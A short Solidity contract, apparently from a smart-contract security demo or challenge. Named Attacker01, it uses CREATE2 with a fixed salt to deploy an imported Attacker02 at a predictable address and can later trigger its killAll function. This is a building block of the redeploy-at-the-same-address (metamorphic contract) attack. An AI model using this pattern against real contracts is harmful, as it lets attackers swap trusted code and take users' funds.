// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Attacker02.sol";

contract Attacker01 {

    Attacker02 public deployedContract;

    function deploy(
        bool isDefault
    ) external returns (address contractAddr) {
        bytes memory bytecode = type(Attacker02).creationCode;
        bytes32 salt = 0x00000000000000000000000000000000000000000000000000000000000abcde;
        assembly {
            contractAddr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }

        deployedContract = Attacker02(contractAddr);
        deployedContract.deploy(isDefault);
    }

    function kill() external {
        deployedContract.killAll();
    }
}